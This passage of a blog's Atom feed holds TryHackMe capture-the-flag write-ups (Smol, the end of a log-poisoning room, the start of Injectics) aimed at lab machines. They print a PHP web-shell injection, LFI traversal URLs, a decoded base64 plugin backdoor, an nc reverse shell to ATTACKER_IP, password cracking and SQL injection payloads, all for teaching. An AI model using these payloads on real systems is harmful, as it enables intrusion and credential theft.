+</span></span><span style="display:flex;"><span>220 mail.filepath.lab ESMTP Postfix (Ubuntu)
+</span></span><span style="display:flex;"><span>helo ok
+</span></span><span style="display:flex;"><span>250 mail.filepath.lab
+</span></span><span style="display:flex;"><span>mail from: &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;
+</span></span><span style="display:flex;"><span>501 5.1.7 Bad sender address syntax
+</span></span><span style="display:flex;"><span>quit
+</span></span><span style="display:flex;"><span>221 2.0.0 Bye
+</span></span><span style="display:flex;"><span>Connection closed by foreign host.
+</span></span></code></pre></div><p>Now we can use <code>cmd</code> parameter to run commands on the system.</p>
+<h2 id="second-flag" >
+  <a href="#second-flag">Second flag</a>
+</h2>
+<p>While it&rsquo;s possible to <a href="https://jaxafed.github.io/posts/tryhackme_include/#log-poisoning-to-rce" class="external-link">start a reverse shell and get access to the entire system</a>, I simply listed files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>http:<span style="color:#89dceb;font-weight:bold">//</span>MACHINE_IP:<span style="color:#fab387">50000</span><span style="color:#89dceb;font-weight:bold">/</span>profile<span style="color:#89dceb;font-weight:bold">.</span>php<span style="color:#f38ba8">?</span>img<span style="color:#89dceb;font-weight:bold">=....//....//....//....//....//....//....//....//....//</span><span style="color:#cba6f7">var</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#89dceb">log</span><span style="color:#89dceb;font-weight:bold">/</span>mail<span style="color:#89dceb;font-weight:bold">.</span>log<span style="color:#89dceb;font-weight:bold">&amp;</span>cmd<span style="color:#89dceb;font-weight:bold">=</span>ls 
+</span></span></code></pre></div><p>And then used LFI again to get the content of the flag file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>http:<span style="color:#89dceb;font-weight:bold">//</span>MACHINE_IP:<span style="color:#fab387">50000</span><span style="color:#89dceb;font-weight:bold">/</span>profile<span style="color:#89dceb;font-weight:bold">.</span>php<span style="color:#f38ba8">?</span>img<span style="color:#89dceb;font-weight:bold">=....//....//....//....//....//....//....//....//....//</span><span style="color:#cba6f7">var</span><span style="color:#89dceb;font-weight:bold">/</span>www<span style="color:#89dceb;font-weight:bold">/</span>html<span style="color:#89dceb;font-weight:bold">/</span>REDACTED<span style="color:#89dceb;font-weight:bold">.</span>txt 
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Smol</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/21/writeup-tryhackme-smol/" hreflang="en"/>
+    <published>2025-02-21T20:12:59Z</published>
+    <updated>2025-02-21T20:12:59Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-21:/articles/2025/02/21/writeup-tryhackme-smol/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/smol" class="external-link">Smol</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/smol" class="external-link">Smol</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web, linux</li>
+</ul>
+<p>At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.</p>
+<p>Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?</p>
+<p>Answer the questions below</p>
+<ol>
+<li>What is the user flag?</li>
+<li>What is the root flag?</li>
+</ol>
+</div>
+<p>The fun part of this room was hopping from one user to another in order to get the root. Vulnerabilities explored were:</p>
+<ul>
+<li>Vulnerable components with LFI and RCE</li>
+<li>Password reuse</li>
+<li>Weak passwords</li>
+<li>User access misconfiguration (group access, PAM, sudoers)</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#getting-into-the-wordpress-dashboard-via-lfi">Getting into the WordPress dashboard via LFI</a></li>
+    <li><a href="#finding-a-backdoored-plugin">Finding a backdoored plugin</a></li>
+    <li><a href="#getting-access-to-diego-and-user-flag">Getting access to <code>diego</code> and user flag</a></li>
+    <li><a href="#getting-access-to-think">Getting access to <code>think</code></a></li>
+    <li><a href="#getting-access-to-gege">Getting access to <code>gege</code></a></li>
+    <li><a href="#getting-access-to-xavi">Getting access to <code>xavi</code></a></li>
+    <li><a href="#getting-the-root-flag">Getting the root flag</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>From the description it looks like we need to find one vulnerable WordPress plugin and with its help find another one. Webpage source code links to JS file belonging to the plugin <code>jsmol2wp</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09
+</span></span></code></pre></div><p>This plugin has LFI vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20463" class="external-link">CVE-2018-20463</a>.</p>
+<h2 id="getting-into-the-wordpress-dashboard-via-lfi" >
+  <a href="#getting-into-the-wordpress-dashboard-via-lfi">Getting into the WordPress dashboard via LFI</a>
+</h2>
+<p>I navigated to <code>http://www.smol.thm/wp-content/plugins/jsmol2wp/</code> to view plugin directory structure so that I could find the vulnerable file. To confirm the vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=file:///etc/passwd
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>think:x:1000:1000:,,,:/home/think:/bin/bash
+</span></span><span style="display:flex;"><span>fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>xavi:x:1001:1001::/home/xavi:/bin/bash
+</span></span><span style="display:flex;"><span>diego:x:1002:1002::/home/diego:/bin/bash
+</span></span><span style="display:flex;"><span>gege:x:1003:1003::/home/gege:/bin/bash
+</span></span></code></pre></div><p>From there I lost time trying to pivot <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html" class="external-link">LFI2RCE via PHP filters</a> because I forgot about the second plugin. I wasn&rsquo;t able to make it work.</p>
+<p>My next step after reading hacktricks was checking <code>wp-config.php</code> file. There is a database user and password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/** The name of the database for WordPress */
+</span></span><span style="display:flex;"><span>define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/** Database username */
+</span></span><span style="display:flex;"><span>define( &#39;DB_USER&#39;, &#39;wpuser&#39; );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/** Database password */
+</span></span><span style="display:flex;"><span>define( &#39;DB_PASSWORD&#39;, &#39;REDACTED&#39; );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/** Database hostname */
+</span></span><span style="display:flex;"><span>define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</span></span></code></pre></div><p>I logged in with this user and password at <code>http://www.smol.thm/wp-login.php</code></p>
+<h2 id="finding-a-backdoored-plugin" >
+  <a href="#finding-a-backdoored-plugin">Finding a backdoored plugin</a>
+</h2>
+<p>There, in the dashboard, I saw a private page <code>Webmaster Tasks!!</code>. It mentions plugin <code>Hello Dolly</code>. Using previously found LFI vulnerability I got its code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../plugins/hello.php
+</span></span></code></pre></div><p>The code has a weird line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#cba6f7">eval</span>(base64_decode(<span style="color:#a6e3a1">&#39;CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=&#39;</span>));
+</span></span></code></pre></div><p>Decoding it from base64:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#cba6f7">if</span> (isset(<span style="color:#f5e0dc">$_GET</span>[<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\143\155\x64</span><span style="color:#a6e3a1">&#34;</span>])) { system(<span style="color:#f5e0dc">$_GET</span>[<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\143\x6d\144</span><span style="color:#a6e3a1">&#34;</span>]); } 
+</span></span></code></pre></div><p>Looks like a promised backdoor. Next, I decoded the parameter name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ php -r <span style="color:#a6e3a1">&#39;echo &#34;\143\155\x64 \143\x6d\144&#34;;&#39;</span> 
+</span></span><span style="display:flex;"><span>cmd cmd
+</span></span></code></pre></div><p>To confirm the backdoor I passed <code>cmd</code> query parameter in the dashboard so that result was shown on the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-admin/index.php?cmd=whoami
+</span></span></code></pre></div><p>Having confirmed RCE, I started a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.smol.thm/wp-admin/?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fbash -i 2&gt;%261|nc ATTACKER_IP 443 &gt;%2Ftmp%2Ff
+</span></span></code></pre></div><p>Make sure to stabilize shell.</p>
+<h2 id="getting-access-to-diego-and-user-flag" >
+  <a href="#getting-access-to-diego-and-user-flag">Getting access to <code>diego</code> and user flag</a>
+</h2>
+<p>Since I already knew database user and password, I connected to the database and got users table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ mysql -u wpuser -p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mysql&gt; use wordpress;
+</span></span><span style="display:flex;"><span>mysql&gt; select user_login, user_pass from wp_users;
+</span></span><span style="display:flex;"><span>+------------+------------------------------------+
+</span></span><span style="display:flex;"><span>| user_login | user_pass                          |
+</span></span><span style="display:flex;"><span>+------------+------------------------------------+
+</span></span><span style="display:flex;"><span>| admin      | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| wpuser     | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| think      | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| gege       | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| diego      | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>| xavi       | $P$REDACTED                        |
+</span></span><span style="display:flex;"><span>+------------+------------------------------------+
+</span></span></code></pre></div><p>John the Ripper with <code>rockyou</code> wordlist cracked a password for the user <code>diego</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat pass   
+</span></span><span style="display:flex;"><span>admin:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>wpuser:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>think:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>gege:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>diego:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>xavi:<span style="color:#f5e0dc">$P$REDACTED</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ john -w<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt pass   
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ john --show pass
+</span></span><span style="display:flex;"><span>diego:REDACTED
+</span></span></code></pre></div><p>In the current reverse shell I changed user to <code>diego</code> and got the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ su diego
+</span></span><span style="display:flex;"><span>$ cat /home/diego/user.txt
+</span></span><span style="display:flex;"><span>REDACTED
+</span></span></code></pre></div><h2 id="getting-access-to-think" >
+  <a href="#getting-access-to-think">Getting access to <code>think</code></a>
+</h2>
+<p>While exploring the system I was able to read private SSH key of the user <code>think</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls /home/think/.ssh
+</span></span><span style="display:flex;"><span>authorized_keys
+</span></span><span style="display:flex;"><span>id_rsa
+</span></span><span style="display:flex;"><span>id_rsa.pub
+</span></span></code></pre></div><p>I copied it to the attack machine and logged in via SSH.</p>
+<h2 id="getting-access-to-gege" >
+  <a href="#getting-access-to-gege">Getting access to <code>gege</code></a>
+</h2>
+<p>Another interesting file I saw was <code>/home/gege/wordpress.old.zip</code> which I wasn&rsquo;t able to access.</p>
+<p>Using <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" class="external-link">LinPEAS</a> I didn&rsquo;t find anything except for its suggestion to try login as different users without a password. Which, surprisingly, worked: <code>su gege</code>. It did <a href="https://jaxafed.github.io/posts/tryhackme-smol/#shell-as-gege" class="external-link">because of PAM configuration</a> in <code>/etc/pam.d/su</code>.</p>
+<h2 id="getting-access-to-xavi" >
+  <a href="#getting-access-to-xavi">Getting access to <code>xavi</code></a>
+</h2>
+<p>File <code>wordpress.old.zip</code> was password-protected. I copied it to the attack machine and ran John the Ripper again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ zip2john wordpress.old.zip &gt; wp   
+</span></span><span style="display:flex;"><span>$ john -w<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt wp
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>$ john --show pass 
+</span></span><span style="display:flex;"><span>REDACTED    
+</span></span></code></pre></div><p>After unzipping the archive I found another <code>wp-config.php</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>define( &#39;DB_NAME&#39; &#39;wordpress&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;DB_USER&#39;, &#39;xavi&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;DB_PASSWORD&#39;, &#39;REDACTED&#39; )
+</span></span><span style="display:flex;"><span>define( &#39;DB_HOST&#39;, &#39;localhost&#39; );  
+</span></span></code></pre></div><p>Attempt to change user to <code>xavi</code> with this password was successful.</p>
+<h2 id="getting-the-root-flag" >
+  <a href="#getting-the-root-flag">Getting the root flag</a>
+</h2>
+<p>Checking privileges for user <code>xavi</code> showed that they can run all commands with <code>sudo</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">[</span>sudo<span style="color:#89dceb;font-weight:bold">]</span> password <span style="color:#cba6f7">for</span> xavi: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#cba6f7">for</span> xavi on smol:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin<span style="color:#89b4fa">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User xavi may run the following commands on smol:
+</span></span><span style="display:flex;"><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL : ALL<span style="color:#89dceb;font-weight:bold">)</span> ALL
+</span></span></code></pre></div><p>Finally, the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo cat /root/root.txt
+</span></span><span style="display:flex;"><span>REDACTED
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Injectics</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/" hreflang="en"/>
+    <published>2025-02-13T04:47:13Z</published>
+    <updated>2025-02-13T04:47:13Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-13:/articles/2025/02/13/writeup-tryhackme-injectics/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/injectics" class="external-link">Injectics</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web</li>
+</ul>
+<p>Can you utilise your web pen-testing skills to safeguard the event from any injection attack?</p>
+<p>Answer the questions below:</p>
+<ol>
+<li>What is the flag value after logging into the admin panel?</li>
+<li>What is the content of the hidden text file in the flags folder?</li>
+</ol>
+</div>
+<p>This room acts as a final challenge for the advanced injection attacks module. Vulnerabilities explored were:</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info" role="note"aria-label="Info">
+    <ul>
+<li><a href="https://tryhackme.com/room/injectics" class="external-link">Injectics</a></li>
+<li>Difficulty: medium</li>
+<li>Platform: web</li>
+</ul>
+<p>Can you utilise your web pen-testing skills to safeguard the event from any injection attack?</p>
+<p>Answer the questions below:</p>
+<ol>
+<li>What is the flag value after logging into the admin panel?</li>
+<li>What is the content of the hidden text file in the flags folder?</li>
+</ol>
+</div>
+<p>This room acts as a final challenge for the advanced injection attacks module. Vulnerabilities explored were:</p>
+<ul>
+<li>Information disclosure</li>
+<li>SQL injections</li>
+<li>Server-side template injection</li>
+</ul>
+<nav class="callout toc" aria-label="Table of Contents">
+<nav id="TableOfContents">
+  <ol>
+    <li><a href="#information-gathering">Information gathering</a></li>
+    <li><a href="#bypassing-authentication-sqli">Bypassing authentication: SQLi</a></li>
+    <li><a href="#resetting-users-sqli">Resetting users: SQLi</a></li>
+    <li><a href="#getting-the-first-flag">Getting the first flag</a></li>
+    <li><a href="#reading-hidden-flag-file-rce-via-ssti">Reading hidden flag file: RCE via SSTI</a></li>
+  </ol>
+</nav>
+</nav>  
+<h2 id="information-gathering" >
+  <a href="#information-gathering">Information gathering</a>
+</h2>
+<p>I didn&rsquo;t go for the port scanning because it was evident that our focus was to find injection points in the web application.</p>
+<p>First, I checked the home page source code. It has interesting comments:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic">&lt;!-- Website developed by John Tim - dev@injectics.thm--&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic">&lt;!-- Mails are stored in mail.log file--&gt;</span>
+</span></span></code></pre></div><p>Next, I explored the website. The only working link on the home page is to the <code>/login.php</code> page which also has &ldquo;Login as administrator&rdquo; link to <code>/adminLogin007.php</code>. Both are loading <code>script.js</code> which handles input validation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">const</span> invalidKeywords <span style="color:#89dceb;font-weight:bold">=</span> [<span style="color:#a6e3a1">&#39;or&#39;</span>, <span style="color:#a6e3a1">&#39;and&#39;</span>, <span style="color:#a6e3a1">&#39;union&#39;</span>, <span style="color:#a6e3a1">&#39;select&#39;</span>, <span style="color:#a6e3a1">&#39;&#34;&#39;</span>, <span style="color:#a6e3a1">&#34;&#39;&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">for</span> (<span style="color:#f38ba8">let</span> keyword <span style="color:#cba6f7">of</span> invalidKeywords) {
+</span></span><span style="display:flex;"><span>	<span style="color:#cba6f7">if</span> (username.includes(keyword)) {
+</span></span><span style="display:flex;"><span>		alert(<span style="color:#a6e3a1">&#39;Invalid keywords detected&#39;</span>);
+</span></span><span style="display:flex;"><span>	   <span style="color:#cba6f7">return</span> <span style="color:#fab387">false</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The script checks for SQL keywords, thus, it seems like a good place to try SQLi.</p>
+<p>Before doing that, I opened <code>/mail.log</code> file mentioned in the comments:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#cba6f7">From</span>: dev<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">To</span>: superadmin<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm
+</span></span><span style="display:flex;"><span>Subject: <span style="color:#cba6f7">Update</span> <span style="color:#cba6f7">before</span> holidays
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hey,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">Before</span> heading off <span style="color:#cba6f7">on</span> holidays, I wanted <span style="color:#cba6f7">to</span> <span style="color:#cba6f7">update</span> you <span style="color:#cba6f7">on</span> the latest changes <span style="color:#cba6f7">to</span> the website. I have implemented several enhancements <span style="color:#cba6f7">and</span> enabled a special service called Injectics. This service continuously monitors the <span style="color:#cba6f7">database</span> <span style="color:#cba6f7">to</span> ensure it remains <span style="color:#cba6f7">in</span> a stable state.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">To</span> <span style="color:#cba6f7">add</span> an extra layer of safety, I have configured the service <span style="color:#cba6f7">to</span> automatically <span style="color:#cba6f7">insert</span> <span style="color:#cba6f7">default</span> credentials <span style="color:#cba6f7">into</span> the <span style="color:#89dceb;font-weight:bold">`</span>users<span style="color:#89dceb;font-weight:bold">`</span> <span style="color:#cba6f7">table</span> <span style="color:#cba6f7">if</span> it <span style="color:#cba6f7">is</span> ever deleted <span style="color:#cba6f7">or</span> becomes corrupted. This ensures that we always have a way <span style="color:#cba6f7">to</span> access the system <span style="color:#cba6f7">and</span> perform necessary maintenance. I have scheduled the service <span style="color:#cba6f7">to</span> run every minute.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here are the <span style="color:#cba6f7">default</span> credentials that will be added:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|</span> Email                     <span style="color:#89dceb;font-weight:bold">|</span> Password 	              <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|---------------------------|-------------------------|</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|</span> superadmin<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm  <span style="color:#89dceb;font-weight:bold">|</span> REDACTED                <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|</span> dev<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm         <span style="color:#89dceb;font-weight:bold">|</span> REDACTED                <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please let me know <span style="color:#cba6f7">if</span> there are any further updates <span style="color:#cba6f7">or</span> changes needed.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Best regards,
+</span></span><span style="display:flex;"><span>Dev Team
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dev<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm
+</span></span></code></pre></div><p>Three important pieces here:</p>
+<ul>
+<li>There are two known users.</li>
+<li>Their info is stored in the table <code>users</code>.</li>
+<li>If something happens to the table, it gets recreated with the default credentials.</li>
+</ul>
+<p>Just to be sure, I tried logging in with these credentials, but it wasn&rsquo;t successful.</p>
+<h2 id="bypassing-authentication-sqli" >
+  <a href="#bypassing-authentication-sqli">Bypassing authentication: SQLi</a>
+</h2>
+<p>I captured requests during login attempts with the Burp Suite. I copied them to files and used <a href="https://sqlmap.org/" class="external-link">sqlmap</a> to find vulnerabilities. It could not detect anything for the administrator login page but successfully identified injection point for the normal login.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">$</span> sqlmap <span style="color:#89dceb;font-weight:bold">-</span>r functions<span style="color:#89dceb;font-weight:bold">.</span>req <span style="color:#89dceb;font-weight:bold">--</span>level <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">...</span>
+</span></span><span style="display:flex;"><span>sqlmap identified the following injection point(s) with a total of <span style="color:#fab387">1758</span> HTTP(s) requests:
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
+</span></span><span style="display:flex;"><span>Parameter: username (POST)
+</span></span><span style="display:flex;"><span>    Type: time<span style="color:#89dceb;font-weight:bold">-</span>based blind
+</span></span><span style="display:flex;"><span>    Title: MySQL <span style="color:#89dceb;font-weight:bold">&gt;=</span> <span style="color:#fab387">5.0</span><span style="color:#89dceb;font-weight:bold">.</span><span style="color:#fab387">12</span> RLIKE time<span style="color:#89dceb;font-weight:bold">-</span>based blind
+</span></span><span style="display:flex;"><span>    Payload: username<span style="color:#89dceb;font-weight:bold">=</span>superadmin<span style="color:#f38ba8">@</span>injectics<span style="color:#89dceb;font-weight:bold">.</span>thm<span style="color:#a6e3a1">&#39; RLIKE SLEEP(5)-- MGux&amp;password=&amp;function=login</span>
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
+</span></span></code></pre></div><p>With the suggested payload, I logged into the dashboard.</p>
+<div class="callout note" role="note"aria-label="Note">
